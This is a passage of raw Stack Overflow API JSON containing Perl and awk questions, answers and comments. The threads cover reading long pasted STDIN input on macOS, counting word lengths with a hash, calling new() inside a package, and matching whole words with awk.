"https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1496462778, "post_id": 44319436, "comment_id": 75683695, "body": "Sure, every OS has limits -- but how many characters do you expect?  65K?  For what is normally expected from the user I don&#39;t see any limit to be in the way.  You haven&#39;t answered my question -- can you show the program, or is this it?  If this is the whole program that bails out after you&#39;ve typed &quot;too long&quot; of an input (how long is that?), then perhaps something&#39;s off with the system or installation."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1496539225, "post_id": 44319436, "comment_id": 75702255, "body": "OK, thanks, this helps. I did, with your code copy-pasted, and it worked fine for me. My guess then would be that it is about that &quot;copy,&quot; in particular that some weird characters get picked up and that they trip it up. What happens if you take a lot of text, but nice normal ASCII?  You can try like this: find a long text file and do <code>cat lotsa.txt | perl script.pl</code>. (This way you feed the STDIN.) You may want to redirect output to a file, so you can nicely review what it puts out. I just tried with a file of half a Mb (65K lines)."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1496539664, "post_id": 44319436, "comment_id": 75702321, "body": "The code I offered for test is better written as <code>perl script.pl &lt; lotsa.txt</code>.  I used piping since then you can also try hand-picked content, like <code>echo &quot;chars to confuse program&quot; | script.pl</code>."}, {"owner": {"reputation": 53, "user_id": 7630721, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/00e5ba6fd4d23085863255d99d9700a2?s=128&d=identicon&r=PG&f=1", "display_name": "Joe", "link": "https://stackoverflow.com/users/7630721/joe"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1496718345, "post_id": 44319436, "comment_id": 75761887, "body": "&quot;cat lotsa.txt | perl script.pl&quot; works. So it is probably as you said -- weird chars. But the purpose of the script is to allow storing of any web copied content into a file. Is there a workaround to achieve such a goal? Thanks!"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1496721834, "post_id": 44319436, "comment_id": 75762650, "body": "OK, that&#39;s progress.  It sounds like you want to start the program, copy select text from a web page, and paste to the terminal, so into STDIN. The problem is that the web page may come in any encoding it pleases.  You can try to add <code>use open &#39;:std&#39;, &#39;:encoding(UTF-8)&#39;;</code>, and if the page is in utf8  this may work. However, it may not for another encoding. Also, I am not sure that you can trust that what you copy with the mouse will work when pasted in any case. I don&#39;t know that you can get this to work reliably."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1496721971, "post_id": 44319436, "comment_id": 75762689, "body": "Here is another idea instead.  Start the program with the URL.  It goes and fetches the page, and parses it.  Then, if you wish to be able to select a passage of text, you may prompt for a starting and ending phrases of the selection, which the user picks up with a mouse making sure that it&#39;s just ASCII, and that it is long enough to be unambiguous. How does that seem?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1496722303, "post_id": 44319436, "comment_id": 75762767, "body": "There are many resources on downloading and parsing web pages, and many many SO posts.  Some standard and good modules for the purpose: <a href=\"http://search.cpan.org/~oalders/libwww-perl-6.26/lib/LWP/UserAgent.pm\" rel=\"nofollow noreferrer\">LWP::UserAgent</a> (or <a href=\"http://search.cpan.org/~oalders/libwww-perl-6.26/lib/LWP/Simple.pm\" rel=\"nofollow noreferrer\">LWP::Simple</a>), <a href=\"http://search.cpan.org/~kentnl/HTML-Tree-5.06/lib/HTML/TreeBuilder.pm\" rel=\"nofollow noreferrer\">HTML::TreeBuilder</a>."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1496722656, "post_id": 44319436, "comment_id": 75762856, "body": "Btw, your statement &quot;<i>the purpose of the script is to allow storing of any web copied content into a file</i>&quot; belongs to the question.  It encapsulates what you actually want very well.  Having that would&#39;ve saved you days of these back and forth comments, and may have yielded informed answers right away.  (Don&#39;t mean to beat on you here, just offering well intended advice.)"}, {"owner": {"reputation": 53, "user_id": 7630721, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/00e5ba6fd4d23085863255d99d9700a2?s=128&d=identicon&r=PG&f=1", "display_name": "Joe", "link": "https://stackoverflow.com/users/7630721/joe"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1496772925, "post_id": 44319436, "comment_id": 75793858, "body": "@zdim I understand using wget or similar tools to download web pages to files and parse the files instead. I&#39;ve done that before. I will try it out and let you know. Thanks much."}, {"owner": {"reputation": 53, "user_id": 7630721, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/00e5ba6fd4d23085863255d99d9700a2?s=128&d=identicon&r=PG&f=1", "display_name": "Joe", "link": "https://stackoverflow.com/users/7630721/joe"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1496783008, "post_id": 44319436, "comment_id": 75799410, "body": "@zdim Just realized that I cannot download a web page to a local file and input from the local file, because very often I need to browse the web page once it&#39;s programmatically opened by a browser. I will have to figure out some other means to resolve the problem."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1496789373, "post_id": 44319436, "comment_id": 75801561, "body": "OK. I don&#39;t know exactly what you need.  What I had in mind is the following. You open a page in your browser, look through it, and now you want some part of it saved.  You start your program as <code>script.pl URL</code>, the program takes the page (by <code>wget</code> if you wish), and parses it into a workable data structure. Then it prompts you for &quot;start-phrase&quot;, you copy it and paste into STDIN, then it prompts you for the &quot;end-phrase&quot; and you give it.  Then it goes into its data structures that it had built for the whole page, finds the text between those phrases, and saves it."}], "answers": [{"comments": [{"owner": {"reputation": 53, "user_id": 7630721, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/00e5ba6fd4d23085863255d99d9700a2?s=128&d=identicon&r=PG&f=1", "display_name": "Joe", "link": "https://stackoverflow.com/users/7630721/joe"}, "edited": false, "score": 0, "creation_date": 1496436557, "post_id": 44324989, "comment_id": 75678353, "body": "I tried @lines = &lt;STDIN&gt; as well and had exactly the same outcome: I pasted the information in, and it got truncated on the screen and the program got halted and wouldn&#39;t respond to anything except ctrl-c."}], "tags": [], "owner": {"reputation": 539, "user_id": 7162389, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wr6Gu.jpg?s=128&g=1", "display_name": "Harini", "link": "https://stackoverflow.com/users/7162389/harini"}, "is_accepted": false, "score": 0, "last_activity_date": 1496394500, "creation_date": 1496394500, "answer_id": 44324989, "question_id": 44319436, "link": "https://stackoverflow.com/questions/44319436/limit-number-of-chars-when-getting-text-from-user-input-in-perl-on-mac-os/44324989#44324989", "title": "limit number of chars when getting text from user input in perl on Mac OS", "body": "<p>In Perl, a scalar variable is used to represent a block of information. \nA scalar may refer to an integer, a float, a string, an object, binary information, etc. </p>\n\n<blockquote>\n  <p>It's a versatile variable with no length limit.</p>\n</blockquote>\n"}], "owner": {"reputation": 53, "user_id": 7630721, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/00e5ba6fd4d23085863255d99d9700a2?s=128&d=identicon&r=PG&f=1", "display_name": "Joe", "link": "https://stackoverflow.com/users/7630721/joe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 97, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1496516618, "creation_date": 1496366619, "last_edit_date": 1496516618, "question_id": 44319436, "link": "https://stackoverflow.com/questions/44319436/limit-number-of-chars-when-getting-text-from-user-input-in-perl-on-mac-os", "title": "limit number of chars when getting text from user input in perl on Mac OS", "body": "<p>I have the following perl code:</p>\n\n<pre><code>  my($result) = \"\";\n\n  while($line = &lt;STDIN&gt;) {\n    $result .= $line;\n  }\n</code></pre>\n\n<p>What I want to do basically is to read the user input and store it in a variable (\"$result\"). The problem is that when the input is too long, the script gets stuck and you will have to ctrl-c to cancel the execution to get out. It sounds like there is a limited number of chars to read . There should be a way to change such a limit.</p>\n\n<p>The perl version I have is: v5.18.2\nMac OS: Sierra 10.12.5</p>\n\n<p>Thanks for any help!</p>\n\n<p>----- additional info --------------------</p>\n\n<p>This is the full code to illustrate the problem:</p>\n\n<pre><code>#!/usr/bin/perl -w\n\n\nprint \"Input your suggestion:\\n\";\n\nmy(@lines) = &lt;STDIN&gt;;\n\nprint \"Your suggestion is:\\n\";\n\nforeach $l (@lines) {\n  print \"$l\";\n}\n</code></pre>\n\n<hr>\n\n<p>Start the script, go to <a href=\"https://en.wikipedia.org/wiki/Opioid_use_disorder#Cause\" rel=\"nofollow noreferrer\">https://en.wikipedia.org/wiki/Opioid_use_disorder#Cause</a> and copy from \"Most people who have an opioid use disorder\" to \"play a role in dependence and overdose\" (too many chars that I cannot copy/paste here), and paste the content to the console as input, and you will see the script halts at \"code for seemingl\".</p>\n"}, {"tags": ["arrays", "perl", "hash"], "comments": [{"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 1, "creation_date": 1496363643, "post_id": 44319055, "comment_id": 75643576, "body": "Why not <code>$wordLength{$length}</code>? It&#39;s super odd you&#39;re keying on word now."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1496366555, "post_id": 44319055, "comment_id": 75644247, "body": "If you still want counts of each length, then you only need to change the brackets from your original code: <code>$wordLength[$length]++</code> becomes <code>$wordLength{$length}++</code>."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1496366678, "post_id": 44319055, "comment_id": 75644280, "body": "Also, &quot;it doesn&#39;t seem to work&quot; is not a valid problem description. What is your code actually doing? How is that different from what you expect?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1496374587, "post_id": 44319055, "comment_id": 75645879, "body": "Can you please clearly state what you need?  If it is the output shown under &quot;<i>This works great reading</i>&quot; then your hash attempt clearly has nothing to do with that.  You are storing <i>words</i> as keys (not lengths) and you aren&#39;t counting.  (Is this a homework by any chance?)"}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 1, "last_activity_date": 1496381105, "creation_date": 1496381105, "answer_id": 44321379, "question_id": 44319055, "link": "https://stackoverflow.com/questions/44319055/perl-using-hash-instead-of-array/44321379#44321379", "title": "Perl: Using hash instead of array", "body": "<p>Why? Any array works great here.</p>\n\n<pre><code>my @occurrences_by_length;\nwhile (my $word = &lt;&gt;) {\n   chomp($word);\n   my $length = length($word);\n   ++$occurrences_by_length[$length];\n}\n\nprint \"Length  Occurrences\\n\";\nfor my $length (1..$#occurrences_by_length) {\n   my $occurrences = $occurrences_by_length[$length]\n      or next;\n\n   printf \"%6d  %11d\\n\", $length, $occurrences;\n}\n</code></pre>\n\n<p>A hash, while less efficient, could easily be used with next to no changes.</p>\n\n<pre><code>my %occurrences_by_length;\nwhile (my $word = &lt;&gt;) {\n   chomp($word);\n   my $length = length($word);\n   ++$occurrences_by_length{$length};\n}\n\nprint \"Length  Occurrences\\n\";\nfor my $length (sort { $a &lt;=&gt; $b } keys(%occurrences_by_length)) {\n   my $occurrences = $occurrences_by_length{$length};\n   printf \"%6d  %11d\\n\", $length, $occurrences;\n}\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 8100471, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/08672326b871a889d748a6d9fde38653?s=128&d=identicon&r=PG&f=1", "display_name": "Greg W", "link": "https://stackoverflow.com/users/8100471/greg-w"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 41, "favorite_count": 0, "accepted_answer_id": 44321379, "answer_count": 1, "score": 0, "last_activity_date": 1496381105, "creation_date": 1496363309, "question_id": 44319055, "link": "https://stackoverflow.com/questions/44319055/perl-using-hash-instead-of-array", "title": "Perl: Using hash instead of array", "body": "<pre><code>while ($word = &lt;STDIN&gt;) {\n    $length = length($word) -1; # Subtract 1 for included newline char\n    $wordLength[$length]++;\n}\n\nprint \"Word length \\t\\t Occurrences \\n\\n\";\n\nfor ( my $i =1; $i &lt;= $#wordLength; $i++ ) {\nif (not exists $wordLength[$i]) {\n    print \"$i \\t\\t\\t 0 \\n\";\n}\n    else {\n    print \"$i \\t\\t\\t $wordLength[$i] \\n\";\n    } \n} \n</code></pre>\n\n<p>This works great reading in a txt file and outputting as such:</p>\n\n<pre><code>Word Length  Occurrence\n1            27 \n2            104 \n3            1039 \n4            3505 \n5            7181 \n6            11765 \n7            15898 \n</code></pre>\n\n<p>I am trying to get this to work using hash instead of an array but it doesn't seem to work. This is my attempt:</p>\n\n<pre><code>while ($word = &lt;STDIN&gt;) {\n    chomp($word);\n    $length = length($word);\n    $wordLength{$word} = \"$length\";\n}\n\nforeach $word (sort keys %wordLength) {\n    print \"$word, $wordLength{$word}\\n\"; # print key and value\n}\n</code></pre>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 377, "user_id": 5373538, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh5.googleusercontent.com/-GxkXfmMS09k/AAAAAAAAAAI/AAAAAAAAAVE/5swI3yJ70nE/photo.jpg?sz=128", "display_name": "genesi5", "link": "https://stackoverflow.com/users/5373538/genesi5"}, "edited": false, "score": 0, "creation_date": 1496363062, "post_id": 44318938, "comment_id": 75643459, "body": "Seems like the first edit is exactly what i need, because second ignores <code>#some magic and operations with $module&#39; content</code>. Thank you, i&#39;ll try that."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 377, "user_id": 5373538, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh5.googleusercontent.com/-GxkXfmMS09k/AAAAAAAAAAI/AAAAAAAAAVE/5swI3yJ70nE/photo.jpg?sz=128", "display_name": "genesi5", "link": "https://stackoverflow.com/users/5373538/genesi5"}, "edited": false, "score": 0, "creation_date": 1496363162, "post_id": 44318938, "comment_id": 75643482, "body": "1) No, it didn&#39;t ignore. <code>some_method</code> is still called to do that. 2) You can still do extra stuff without the extra method that&#39;s not really a method at all. Poor separation of tasks in that first edit."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 4, "last_activity_date": 1496362525, "creation_date": 1496362525, "answer_id": 44318938, "question_id": 44318825, "link": "https://stackoverflow.com/questions/44318825/perl-invoke-new-inside-package/44318938#44318938", "title": "Perl, Invoke new() inside package", "body": "<p>Yes, <code>__PACKAGE__-&gt;class_method</code> is perfectly legit.</p>\n\n<p>Lots of other problems, though:</p>\n\n<ul>\n<li>You are using incorrect prototypes.</li>\n<li>You are using prototypes.</li>\n<li>You are using prototypes on methods, even though they are ignored for method calls.</li>\n<li><code>$module</code> should be scoped to the method in which it's used.</li>\n<li>You should use the provided class instead of <code>__PACKAGE__</code>.</li>\n<li>I'm not a fan of \"modulinos\" (<code>... unless caller;</code> at the top level of modules).</li>\n<li>You nave needless <code>;</code> terminating your sub declarations/definitions.</li>\n</ul>\n\n<p>Fixed:</p>\n\n<pre><code>package Module::Module;\n\nsub new { ... }\n\nsub some_method { ... }\n\nsub _standalone_init {\n    my ($class) = @_;\n    my $object = $class-&gt;new();\n    $object-&gt;some_method();\n}\n\n__PACKAGE__-&gt;_standalone_init() unless caller;\n\n1;\n</code></pre>\n\n<p>or just</p>\n\n<pre><code>package Module::Module;\n\nsub new { ... }\n\nsub some_method { ... }\n\n__PACKAGE__-&gt;new()-&gt;some_method() if !caller;\n\n1;\n</code></pre>\n"}], "owner": {"reputation": 377, "user_id": 5373538, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh5.googleusercontent.com/-GxkXfmMS09k/AAAAAAAAAAI/AAAAAAAAAVE/5swI3yJ70nE/photo.jpg?sz=128", "display_name": "genesi5", "link": "https://stackoverflow.com/users/5373538/genesi5"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 41, "favorite_count": 0, "accepted_answer_id": 44318938, "answer_count": 1, "score": 0, "last_activity_date": 1496362525, "creation_date": 1496361550, "question_id": 44318825, "link": "https://stackoverflow.com/questions/44318825/perl-invoke-new-inside-package", "title": "Perl, Invoke new() inside package", "body": "<p>So, i have a perl module, and i want to use it not only as module, but standalone utility. Is it correct to call new() inside module like that:</p>\n\n<pre><code>package Module::Module;\n\nsub new(){};\n\nsub some_method(){};\n\nsub _standalone_init(){\n    $module = __PACKAGE__-&gt;new();\n    #some magic and operations with $module' content\n    &amp;some_method();\n};\n\n__PACKAGE__-&gt;_standalone_init() unless caller;\n\n1;\n__END__\n</code></pre>\n"}, {"tags": ["perl", "awk", "sed", "grep"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1496349575, "post_id": 44316592, "comment_id": 75639189, "body": "You could ask it to add line-numbers, then use those to reassemble it."}, {"owner": {"reputation": 123, "user_id": 4192446, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/55c3618a41fa03c51b55fef9e95c9c27?s=128&d=identicon&r=PG&f=1", "display_name": "Linguist", "link": "https://stackoverflow.com/users/4192446/linguist"}, "reply_to_user": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1496374372, "post_id": 44316592, "comment_id": 75645838, "body": "@EdMorton, I am concerned about the exact word match. That&#39;s it. Hence, Them and They&#39;re shall also be deleted post filtering."}, {"owner": {"reputation": 123, "user_id": 4192446, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/55c3618a41fa03c51b55fef9e95c9c27?s=128&d=identicon&r=PG&f=1", "display_name": "Linguist", "link": "https://stackoverflow.com/users/4192446/linguist"}, "edited": false, "score": 0, "creation_date": 1496376309, "post_id": 44316592, "comment_id": 75646268, "body": "Because, I think, if an exact word match is specified in the filter, that query can be solved. i.e &lt;them&gt; &lt;they&#39;re&gt; both shall be deleted as both does not match the strong &lt;the&gt; or &lt;they&gt;. So, I would thankful if you could suggest the exact word match thing?"}, {"owner": {"reputation": 123, "user_id": 4192446, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/55c3618a41fa03c51b55fef9e95c9c27?s=128&d=identicon&r=PG&f=1", "display_name": "Linguist", "link": "https://stackoverflow.com/users/4192446/linguist"}, "reply_to_user": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1496377579, "post_id": 44316592, "comment_id": 75646631, "body": "@EdMorton: Sure. Let me edit all the test cases and explain the question better. Thanks for such a wonderful advice."}, {"owner": {"reputation": 123, "user_id": 4192446, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/55c3618a41fa03c51b55fef9e95c9c27?s=128&d=identicon&r=PG&f=1", "display_name": "Linguist", "link": "https://stackoverflow.com/users/4192446/linguist"}, "reply_to_user": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1496378476, "post_id": 44316592, "comment_id": 75646912, "body": "@EdMorton: Thanks for such a wonderful ideas and feedback. Your points are pretty valid and one would certainly want such modifications later in the script as far as word boundary and quoted words are concerned. But presently, the concern is about a simple match with space separated. Also, It would be so good of you, if you can provide all such modification in detail with various test cases as you have suggested. It shall turn a nice article for readers like me."}, {"owner": {"reputation": 123, "user_id": 4192446, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/55c3618a41fa03c51b55fef9e95c9c27?s=128&d=identicon&r=PG&f=1", "display_name": "Linguist", "link": "https://stackoverflow.com/users/4192446/linguist"}, "reply_to_user": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 1, "creation_date": 1496405910, "post_id": 44316592, "comment_id": 75661626, "body": "@EdMorton: I understand. I really appreciate your help and all the suggestion so far. The entire discussions and various approach to this problems have been already a great help. Thanks."}], "answers": [{"comments": [{"owner": {"reputation": 79972, "user_id": 298607, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/DVW9g.jpg?s=128&g=1", "display_name": "dawg", "link": "https://stackoverflow.com/users/298607/dawg"}, "edited": false, "score": 0, "creation_date": 1496364031, "post_id": 44316764, "comment_id": 75643672, "body": "This matches anything that contains <code>The</code> including <code>daThehu</code>"}], "tags": [], "owner": {"reputation": 62252, "user_id": 1435869, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TrEd9.jpg?s=128&g=1", "display_name": "karakfa", "link": "https://stackoverflow.com/users/1435869/karakfa"}, "is_accepted": false, "score": 1, "last_activity_date": 1496349751, "creation_date": 1496349751, "answer_id": 44316764, "question_id": 44316592, "link": "https://stackoverflow.com/questions/44316592/can-grep-or-sed-show-only-words-that-match-multiple-search-patterns-in-a-line/44316764#44316764", "title": "Can grep or sed show only words that match multiple search patterns in a line?", "body": "<p><code>awk</code> to the rescue!</p>\n\n<pre><code>$ awk -v p=\"They?\" '$0~p{for(i=1;i&lt;=NF;i++) if($i~p) printf \"%s\",$i OFS; print \"\"}' file\n\nThe\nThe They\nThey The\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 95936, "user_id": 5866580, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/1de2cd722d865edac1575102a48ecc0a?s=128&d=identicon&r=PG&f=1", "display_name": "RavinderSingh13", "link": "https://stackoverflow.com/users/5866580/ravindersingh13"}, "edited": false, "score": 0, "creation_date": 1496362063, "post_id": 44317168, "comment_id": 75643246, "body": "Could you please do let me know which version of awk you are using, as I am using GNU Awk 3.1.7 and not finding this option &quot;FPAT&quot;. Will be grateful to you sir."}, {"owner": {"reputation": 79972, "user_id": 298607, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/DVW9g.jpg?s=128&g=1", "display_name": "dawg", "link": "https://stackoverflow.com/users/298607/dawg"}, "edited": false, "score": 0, "creation_date": 1496363823, "post_id": 44317168, "comment_id": 75643616, "body": "This will print any word that contains <code>The</code>. Try <code>echo &#39;Them Then Matches?&#39; | awk -v FPAT=&#39;They?&#39; &#39;{$1=$1}1&#39;</code>"}, {"owner": {"reputation": 79972, "user_id": 298607, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/DVW9g.jpg?s=128&g=1", "display_name": "dawg", "link": "https://stackoverflow.com/users/298607/dawg"}, "edited": false, "score": 0, "creation_date": 1496364394, "post_id": 44317168, "comment_id": 75643749, "body": "Try <code>echo &#39;Them Then daTheu?&#39; | awk -v FPAT=&#39;They?&#39; &#39;{$1=$1}1&#39;</code>"}, {"owner": {"reputation": 79972, "user_id": 298607, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/DVW9g.jpg?s=128&g=1", "display_name": "dawg", "link": "https://stackoverflow.com/users/298607/dawg"}, "edited": false, "score": 1, "creation_date": 1496364519, "post_id": 44317168, "comment_id": 75643778, "body": "I think you want <code>awk -v FPAT=&#39;\\\\&lt;They?\\\\&gt;&#39; &#39;{$1=$1}1&#39;</code> with word boundaries."}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "reply_to_user": {"reputation": 79972, "user_id": 298607, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/DVW9g.jpg?s=128&g=1", "display_name": "dawg", "link": "https://stackoverflow.com/users/298607/dawg"}, "edited": false, "score": 0, "creation_date": 1496375308, "post_id": 44317168, "comment_id": 75646025, "body": "@dawg I posted the answer before the OP clarified their requirements for partial matches. Yes, given their now state requirements you would want some kind of boundaries as well as case insensitivity but word boundaries wouldn&#39;t eliminate matching <code>They</code> in <code>They&#39;re</code> as the OP wants."}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "reply_to_user": {"reputation": 95936, "user_id": 5866580, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/1de2cd722d865edac1575102a48ecc0a?s=128&d=identicon&r=PG&f=1", "display_name": "RavinderSingh13", "link": "https://stackoverflow.com/users/5866580/ravindersingh13"}, "edited": false, "score": 1, "creation_date": 1496437477, "post_id": 44317168, "comment_id": 75678736, "body": "@RavinderSingh13 your awk version is about 5 years and several releases behind. <code>FPAT</code> has been in gawk since 4.0 which came out a few years ago. Get an updated gawk as you&#39;re missing a TON of extremely useful functionality."}], "tags": [], "owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": 